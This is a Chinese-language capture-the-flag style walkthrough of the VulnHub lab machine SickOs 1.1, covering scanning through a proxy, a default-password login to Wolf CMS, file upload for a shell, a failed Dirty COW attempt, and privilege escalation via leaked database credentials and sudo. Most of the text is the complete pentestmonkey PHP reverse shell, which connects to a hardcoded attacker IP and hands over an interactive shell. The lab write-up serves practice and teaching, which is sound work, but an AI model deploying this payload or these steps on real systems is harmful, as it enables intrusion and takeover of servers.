# 原创
：  VulnHub渗透测试实战靶场 - SICKOS: 1.1

# VulnHub渗透测试实战靶场 - SICKOS: 1.1

#### VulnHub渗透测试实战靶场 - SICKOS: 1.1

## 环境下载

> 
戳此进行[环境下载](https://download.vulnhub.com/sickos/sick0s1.1.7z)


## SICKOS: 1.1靶机搭建

> 
将下载好的靶机导入Vmware，网络连接设置为NAT模式即可


## 渗透测试

### 信息搜集

> 
用arp-scan探测一下网段内目标靶机的IP：`sudo arp-scan -l`<br/> 得到目标靶机的IP为：`192.168.246.134`


> 
用Nmap探测一下目标靶机IP的端口信息：`sudo nmap -sS -A 192.168.246.134`，发现开放了`22、3128、8080`三个端口


> 
通过Nmap扫到的端口信息可知，3128端口开放了一个代理服务，直接访问是访问不了靶机的80端口的，可以借助它的代理来访问<br/> 用dirb扫描一些web目录：`dirb http://192.168.246.134 -p http://192.168.246.134:3128`


### 漏洞挖掘

> 
为了后续测试的便捷，先给浏览器添加一个代理


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d5a0e087141f4a0e93c6001906a23455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/593741962df746bfa00e776ceb0337ec.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
根据目录扫描的结果，访问：`http://192.168.246.134/robots.txt`


> 
对`192.168.246.134/wolfcms`进行扫描


> 
在`http://192.168.246.134/wolfcms/docs/updating.txt`页面中记录了更新的信息，发现系统采用的cms版本最新是`0.8.2`，搜索对应版本后发现存在文件上传漏洞


> 
通过网页链接测试出后台登录页面：`http://192.168.246.134/wolfcms/?/admin/login`，尝试`admin:admin`成功登录后台


### getshell

> 
这里通过创建新文件或者上传文件都可以getshell


> 
利用Kali自带的php反弹shell的脚本


```
&lt;?php
phpinfo();
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.246.129';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?&gt; 

```

> 
nc起一个监听，访问含有反弹shell的php文件，成功getshell


### 提权

> 
查看内核版本信息：`uname -a`，发现系统为`3.11.0-15-generic`，尝试溢出提权的方式来进行提权操作，利用脏牛漏洞来进行提权操作


> 
攻击机起一个Http服务让靶机下载exp


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4886172599eb415dba82ea06e46ae03f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/592c267b7ba248a2933715840e12a3c8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
使用命令：`gcc -pthread dirty.c -o dirty -lcrypt`来编译exp，执行exp后发现靶机会自己修复，没法执行脏牛


> 
继续寻找有效信息，在`/var/www/wolfcms/config.php`中发现数据库的账户和密码：`root:john@123`


> 
查看`/etc/passwd`，发现`sickos`用户可以尝试利用


> 
成功利用前面获取到的数据库密码登录切换到用户`sickos`，查看用户id以及组id信息


> 
发现用户`sickos`在sudo组，直接sudo提权，成功拿到root权限

